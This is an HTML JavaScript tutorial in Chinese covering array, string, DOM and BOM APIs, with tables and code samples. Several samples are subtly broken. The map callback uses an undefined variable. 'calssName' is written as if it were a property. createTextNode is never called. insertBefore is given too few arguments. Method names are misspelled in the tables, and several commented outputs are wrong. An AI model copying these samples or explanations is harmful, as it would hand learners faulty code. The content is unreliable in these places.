<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">push</span>(<span class="number">4</span>);    <span class="comment">// 修改原数组,返回新数组长度 4,arr = [1, 2, 3, 4]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">pop</span>();      <span class="comment">// 修改原数组,返回被删除的元素 4,arr = [1, 2, 3]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">unshift</span>(<span class="number">0</span>); <span class="comment">// 修改原数组,返回新数组长度 4,arr = [0, 1, 2, 3]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">shift</span>();    <span class="comment">// 修改原数组,返回被删除的元素 0,arr = [1, 2, 3]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">2</span>); <span class="comment">// 不会修改原数组,返回被裁切出来的数组 [1, 2],arr = [1, 2, 3]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">slice</span>(<span class="number">1</span>);   <span class="comment">// 如果只有一个参数, 则作为开始下标 裁切到数组尾部</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">splice</span>(<span class="number">1</span>,<span class="number">2</span>);<span class="comment">// 会修改原数组,返回切割出来的数组 [2, 3],arr = [1]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">splice</span>(<span class="number">1</span>);  <span class="comment">// 如果只有一个参数, 则作为开始裁切的下标, 裁切到数组尾部</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">splice</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>); <span class="comment">// 替换,newArr=[1, 2],arr=[1, 0, 0] </span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">concat</span>([<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]); <span class="comment">// 不会修改原数组,会返回连接出来的新数组 [1,2,3,4,5,6]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">join</span>(<span class="string">&quot;-&quot;</span>);  <span class="comment">// 不会修改原数组, 返回连接过后的新字符串 1-2-3-4-5-6</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">reverse</span>();  <span class="comment">// 会修改原数组,返回反转过后的数组 [6,5,4,3,2,1]</span></span><br></pre></td></tr></table></figure>
<br>
<h2 id="2-数组遍历">2.数组遍历</h2>
<ul>
<li><strong>every()</strong> 用于检测数组所有元素是否都符合指定条件</li>
<li><strong>filter()</strong> 创建一个新数组, 其包含通过所提供函数实现的测试的所有元素</li>
<li><strong>forEach()</strong> 对数组的每个元素执行一次给定的函数</li>
<li><strong>map()</strong> 创建一个新数组，其结果是该数组中的每个元素是调用一次提供的函数后的返回值。</li>
<li><strong>some()</strong> 用于检测数组中的元素是否满足指定条件</li>
<li><strong>findIndex()</strong> 返回数组中满足条件的第一个元素的索引。若没有找到对应元素则返回-1。</li>
</ul>
<p>代码如下（every）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 是否全部大于0</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"><span class="keyword">let</span> flag = arr.<span class="title function_">every</span>( <span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> item &gt; <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(flag); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>代码如下（filter）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>];</span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">filter</span>( <span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 筛选符合条件的部分</span></span><br><span class="line">    <span class="keyword">if</span> (item % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 函数执行的结果为true, 则当前元素就是过滤出来的元素, 会返回成新数组</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;筛选出来的数组 =&gt;&quot;</span>, newArr); <span class="comment">// [2，4，6，8，10];</span></span><br></pre></td></tr></table></figure>
<p>代码如下（forEach）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>,];</span><br><span class="line">arr.<span class="title function_">forEach</span>( <span class="function">(<span class="params">item,index,array</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数组的每一项 =&gt;&quot;</span>, item);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数组的下标 =&gt;&quot;</span>, index);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数组本身 =&gt;&quot;</span>, array);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>代码如下（map）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>];</span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">map</span>( <span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 把每一个元素 放大两倍, 然后返回成新的数组</span></span><br><span class="line">    e = e * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;新数组 =&gt;&quot;</span>, newArr); <span class="comment">//  [3, 5, 7, 9, 11, 13, 15, 17, 19, 21]</span></span><br></pre></td></tr></table></figure>
<p>代码如下（some）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 是否全部大于0</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"><span class="keyword">let</span> flag = arr.<span class="title function_">some</span>( <span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> item &gt; <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(flag); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>代码如下（findIndex）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">5</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">130</span>, <span class="number">44</span>];</span><br><span class="line"><span class="keyword">let</span> index = arr.<span class="title function_">findIndex</span>( <span class="function"><span class="params">item</span> =&gt;</span> item == <span class="number">12</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(index);  <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<br>
<h1>四、字符串API</h1>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">charAt()</td>
<td style="text-align:left">获取指定下标的字符</td>
</tr>
<tr>
<td style="text-align:left">charCodeAt()</td>
<td style="text-align:left">如果不传参数, 把第0个字符转unicode编码</td>
</tr>
<tr>
<td style="text-align:left">String.fromCharCode()</td>
<td style="text-align:left">静态方法,把unicode编码转成字符</td>
</tr>
<tr>
<td style="text-align:left">substring()</td>
<td style="text-align:left">裁切字符串,从开始下标裁切到结束下标,结束下标裁切不到</td>
</tr>
<tr>
<td style="text-align:left">split()</td>
<td style="text-align:left">把字符串切割成数组</td>
</tr>
<tr>
<td style="text-align:left">repeat()</td>
<td style="text-align:left">重复一个字符串n次</td>
</tr>
<tr>
<td style="text-align:left">trim()</td>
<td style="text-align:left">去除字符串左右两边的空格, 中间的空格则不做处理</td>
</tr>
<tr>
<td style="text-align:left">toLowerCase()</td>
<td style="text-align:left">把字符串转小写</td>
</tr>
<tr>
<td style="text-align:left">toUpperCase()</td>
<td style="text-align:left">把字符串转大写</td>
</tr>
<tr>
<td style="text-align:left">replace()</td>
<td style="text-align:left">替换</td>
</tr>
<tr>
<td style="text-align:left">indexOf()</td>
<td style="text-align:left">从头部开始检索下标</td>
</tr>
<tr>
<td style="text-align:left">lastIndexOf()</td>
<td style="text-align:left">从尾部开始检索下标</td>
</tr>
</tbody>
</table>
<p>代码如下（例子）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;hello wolrd&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">charAt</span>(<span class="number">0</span>);     <span class="comment">// 获取下标值 h</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">charCodeAt</span>(<span class="number">0</span>); <span class="comment">// 获取下标值并转换为unicode编码 104 </span></span><br><span class="line"><span class="keyword">var</span> newStr = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">104</span>);  <span class="comment">// 把unicode编码转成字符 h</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">4</span>);<span class="comment">// 从开始下标裁切到结束下标,结束下标裁切不到 ell</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>);    <span class="comment">// 把字符串切割成数组 [&quot;hello&quot;, &quot;wolrd&quot;]</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">repeat</span>(<span class="number">2</span>);     <span class="comment">// 重复字符串 hello wolrdhello wolrd</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">trim</span>();        <span class="comment">// 去除字符串左右两边的空格 hello wolrd</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">toLowerCase</span>(); <span class="comment">// 把字符串转小写 hello wolrd</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">toUpperCase</span>(); <span class="comment">// 把字符串转大写 HELLO WOLRD</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">replace</span>(<span class="string">&quot;h&quot;</span>,<span class="string">&quot;w&quot;</span>); <span class="comment">// 替换 wello Wolrd</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">indexOf</span>(<span class="string">&quot;h&quot;</span>);     <span class="comment">// 从头部开始检索下标 0</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;l&quot;</span>); <span class="comment">// 从尾部开始检索下标 8</span></span><br></pre></td></tr></table></figure>
<br>
<h1>五、DOM对象</h1>
 <br>
<h2 id="1-元素节点">1.元素节点</h2>
<blockquote>
<p>文档本身是文档节点<br>
所有 HTML 元素是元素节点<br>
所有 HTML 属性是属性节点<br>
HTML 元素内的文本是文本节点<br>
注释是注释节点</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">parentNode</td>
<td style="text-align:left">获取父节点,包括文本节点和注释节点</td>
</tr>
<tr>
<td style="text-align:left">firstChild</td>
<td style="text-align:left">获取第一个子节点</td>
</tr>
<tr>
<td style="text-align:left">lastChild</td>
<td style="text-align:left">获取最后一个子节点</td>
</tr>
<tr>
<td style="text-align:left">nextSibling</td>
<td style="text-align:left">获取下一个同胞节点</td>
</tr>
<tr>
<td style="text-align:left">previousSibling</td>
<td style="text-align:left">获取上一个同胞节点</td>
</tr>
<tr>
<td style="text-align:left">parentElement</td>
<td style="text-align:left">获取父元素版本节点，不包括文本节点和注释节点</td>
</tr>
<tr>
<td style="text-align:left">firstElementChild</td>
<td style="text-align:left">获取第一个子节点的元素版本</td>
</tr>
<tr>
<td style="text-align:left">lastElementChild</td>
<td style="text-align:left">获取最后一个子节点的元素版本</td>
</tr>
<tr>
<td style="text-align:left">nextElementSibling</td>
<td style="text-align:left">获取下一个同胞节点的元素版本</td>
</tr>
<tr>
<td style="text-align:left">previousElementSibling</td>
<td style="text-align:left">获取上一个同胞节点的元素版本</td>
</tr>
</tbody>
</table>
<p>代码如下（例子）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>这是第1个li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>这是第2个li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>这是第3个li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>这是第4个li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>这是第5个li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>这是第6个li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;p&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> ele = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;list&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;父节点=&gt;&quot;</span>,ele.<span class="property">parentNode</span>);          <span class="comment">// div#box</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第一个子节点=&gt;&quot;</span>,ele.<span class="property">firstChild</span>);     <span class="comment">// #text</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;最后一个子节点=&gt;&quot;</span>,ele.<span class="property">lastChild</span>);    <span class="comment">// #text</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;上一个同胞节点=&gt;&quot;</span>,ele.<span class="property">previousSibling</span>);    <span class="comment">// #text</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;上一个同胞节点=&gt;&quot;</span>,ele.<span class="property">previousSibling</span>);    <span class="comment">// #text</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;父元素版本节点=&gt;&quot;</span>,ele.<span class="property">parentElement</span>);      <span class="comment">// div#box</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第一个元素节点=&gt;&quot;</span>,ele.<span class="property">firstElementChild</span>);  <span class="comment">// li.item</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;最后一个元素节点=&gt;&quot;</span>,ele.<span class="property">lastElementChild</span>); <span class="comment">// li.item</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;上一个同胞元素节点=&gt;&quot;</span>,ele.<span class="property">previousElementSibling</span>);  <span class="comment">// p#text</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;下一个同胞元素节点=&gt;&quot;</span>,ele.<span class="property">nextElementSibling</span>);      <span class="comment">// div#p</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="2-获取或插入内容">2.获取或插入内容</h2>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">innerHTML</td>
<td style="text-align:left">获取元素内部的所有内容 (包括文本和元素)</td>
</tr>
<tr>
<td style="text-align:left">innerText</td>
<td style="text-align:left">获取元素内部的文本内容 (只获取文本不获取元素)</td>
</tr>
<tr>
<td style="text-align:left">textContent</td>
<td style="text-align:left">获取元素内部的文本内容 (只获取文本不获取元素)</td>
</tr>
</tbody>
</table>
<h2 id="3-获取元素属性">3.获取元素属性</h2>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">getAttributeNode()</td>
<td style="text-align:left">获取元素属性节点</td>
</tr>
<tr>
<td style="text-align:left">getAttribute()</td>
<td style="text-align:left">获取元素属性的属性值</td>
</tr>
<tr>
<td style="text-align:left">setAttribute()</td>
<td style="text-align:left">设置元素属性的属性值</td>
</tr>
<tr>
<td style="text-align:left">removeAttribute()</td>
<td style="text-align:left">删除元素的属性</td>
</tr>
<tr>
<td style="text-align:left">hasAttribute()</td>
<td style="text-align:left">判断元素是否具有某个属性</td>
</tr>
</tbody>
</table>
<p>代码如下（例子）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="title function_">getAttributeNode</span>(<span class="string">&quot;id&quot;</span>));       <span class="comment">// div, typeof = &quot;Object&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="title function_">getAttribute</span>(<span class="string">&quot;id&quot;</span>));           <span class="comment">// div, typeof = &quot;string&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="title function_">setAttribute</span>(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;dd&quot;</span>));      <span class="comment">// undefined, 修改id为dd </span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="title function_">removeAttribute</span>(<span class="string">&quot;id&quot;</span>));        <span class="comment">// undefined, 删除id</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="title function_">hasAttribute</span>(<span class="string">&quot;id&quot;</span>));           <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="4-创建或插入节点">4.创建或插入节点</h2>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">createTextNode()</td>
<td style="text-align:left">创建文本节点</td>
</tr>
<tr>
<td style="text-align:left">createElement()</td>
<td style="text-align:left">创建元素节点</td>
</tr>
<tr>
<td style="text-align:left">appendChild()</td>
<td style="text-align:left">把节点插入到元素内部的结尾部分</td>
</tr>
<tr>
<td style="text-align:left">nsertBefore()</td>
<td style="text-align:left">把节点插入到元素内部的指定元素的前面</td>
</tr>
<tr>
<td style="text-align:left">removeChild()</td>
<td style="text-align:left">在节点中移除指定的子节点</td>
</tr>
<tr>
<td style="text-align:left">remove()</td>
<td style="text-align:left">移除本身</td>
</tr>
<tr>
<td style="text-align:left">replaceChild()</td>
<td style="text-align:left">用新的节点替换旧的节点</td>
</tr>
<tr>
<td style="text-align:left">cloneNode()</td>
<td style="text-align:left">克隆节点</td>
</tr>
<tr>
<td style="text-align:left">crateDocumentFragment()</td>
<td style="text-align:left">创建临时文档，虚拟DOM节点</td>
</tr>
</tbody>
</table>
<p>代码如下（例子）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> h1 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;h1&quot;</span>);</span><br><span class="line">h1.<span class="property">textContent</span> = <span class="string">&quot;这是一个创建的标题标签&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(h1);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">insertBefore</span>(h1);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(h1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> text = <span class="variable language_">document</span>.<span class="property">createTextNode</span>;</span><br><span class="line">text.<span class="property">textContent</span> = <span class="string">&quot;这是一个创建的文本&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(text);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">insertBefore</span>(text);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(text)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传递一个可选的参数决定是否要拷贝子节点(默认: false不拷贝子节点) (true拷贝子节点) </span></span><br><span class="line"><span class="keyword">var</span> cloneNode = text.<span class="title function_">cloneNode</span>(<span class="literal">true</span>); </span><br></pre></td></tr></table></figure>
<h2 id="5-其它">5.其它</h2>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">element.nodeName</td>
<td style="text-align:left">获取节点名字（大写)</td>
</tr>
<tr>
<td style="text-align:left">element.calssName</td>
<td style="text-align:left">设置或获取节点类名</td>
</tr>
<tr>
<td style="text-align:left"><a href="http://element.id">element.id</a></td>
<td style="text-align:left">设置或获取节点id</td>
</tr>
<tr>
<td style="text-align:left">element.style</td>
<td style="text-align:left">设置或获取节点样式</td>
</tr>
<tr>
<td style="text-align:left">element.dataset</td>
<td style="text-align:left">设置自定义属性</td>
</tr>
<tr>
<td style="text-align:left">element.classList.add()</td>
<td style="text-align:left">添加类名</td>
</tr>
<tr>
<td style="text-align:left">element.classList.toggle()</td>
<td style="text-align:left">切换类名</td>
</tr>
<tr>
<td style="text-align:left">element.classList.remove()</td>
<td style="text-align:left">移除类名</td>
</tr>
<tr>
<td style="text-align:left">element.classList.replace()</td>
<td style="text-align:left">替换类名</td>
</tr>
<tr>
<td style="text-align:left">element.offsetHeight</td>
<td style="text-align:left">返回元素的高度</td>
</tr>
<tr>
<td style="text-align:left">element.offsetTop</td>
<td style="text-align:left">返回元素的垂直偏移位置</td>
</tr>
<tr>
<td style="text-align:left">element.scrollTop</td>
<td style="text-align:left">返回元素上边缘与视图之间的距离</td>
</tr>
<tr>
<td style="text-align:left">element.clientHeight</td>
<td style="text-align:left">返回元素的可见高度</td>
</tr>
<tr>
<td style="text-align:left">element.offsetTop</td>
<td style="text-align:left">返回元素的垂直偏移位置</td>
</tr>
</tbody>
</table>
<p>代码如下（例子）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;box&quot;</span> <span class="attr">class</span>=<span class="string">&quot;div&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">parentNode</span>);  <span class="comment">// DIV  </span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">calssName</span>);   <span class="comment">// div     </span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">id</span>);          <span class="comment">// box   </span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">dataset</span>.<span class="property">id</span>);  <span class="comment">// 1</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 设置类名(会把所有类名覆盖)</span></span></span><br><span class="line"><span class="language-javascript">    box.<span class="property">calssName</span> = <span class="string">&quot;newCalss&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 设置id(会把所有id覆盖)</span></span></span><br><span class="line"><span class="language-javascript">    box.<span class="property">id</span> = <span class="string">&quot;newId&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 设置样式</span></span></span><br><span class="line"><span class="language-javascript">    box.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&quot;red&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 添加类名</span></span></span><br><span class="line"><span class="language-javascript">    box.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;add&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 切换类名,如果有该类名就移除该类名，如果没有就添加</span></span></span><br><span class="line"><span class="language-javascript">    box.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 移除类名</span></span></span><br><span class="line"><span class="language-javascript">    box.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 替换类名</span></span></span><br><span class="line"><span class="language-javascript">    box.<span class="property">classList</span>.<span class="title function_">replace</span>(<span class="string">&quot;div&quot;</span>,<span class="string">&quot;newDiv&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<br>
<h1>六、事件对象</h1>
<br>
<p><a href="https://www.runoob.com/jsref/dom-obj-event.html">菜鸟详细地址</a></p>
<br>
<h1>七、BOM对象</h1>
<blockquote>
<p>所有浏览器都支持 window 对象。它表示浏览器窗口<br>
所有 JavaScript 全局对象、函数以及变量均自动成为 window 对象的成员<br>
全局变量是 window 对象的属性<br>
全局函数是 window 对象的方法<br>
甚至 HTML DOM 的 document 也是 window 对象的属性之一</p>
</blockquote>
<h2 id="1-Window-对象属性">1.Window 对象属性</h2>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">closed</td>
<td style="text-align:left">返回窗口是否已被关闭。</td>
</tr>
<tr>
<td style="text-align:left">defaultStatus</td>
<td style="text-align:left">设置或返回窗口状态栏中的默认文本。</td>
</tr>
<tr>
<td style="text-align:left">document</td>
<td style="text-align:left">对 Document 对象的只读引用。</td>
</tr>
<tr>
<td style="text-align:left">frames</td>
<td style="text-align:left">返回窗口中所有命名的框架。</td>
</tr>
<tr>
<td style="text-align:left">history</td>
<td style="text-align:left">对 History 对象的只读引用。请参数 History 对象。</td>
</tr>
<tr>
<td style="text-align:left">innerHeight</td>
<td style="text-align:left">返回窗口的文档显示区的高度。</td>
</tr>
<tr>
<td style="text-align:left">innerWidth</td>
<td style="text-align:left">返回窗口的文档显示区的宽度。</td>
</tr>
<tr>
<td style="text-align:left">localStorage</td>
<td style="text-align:left">在浏览器中存储 key/value 对。没有过期时间。</td>
</tr>
<tr>
<td style="text-align:left">length</td>
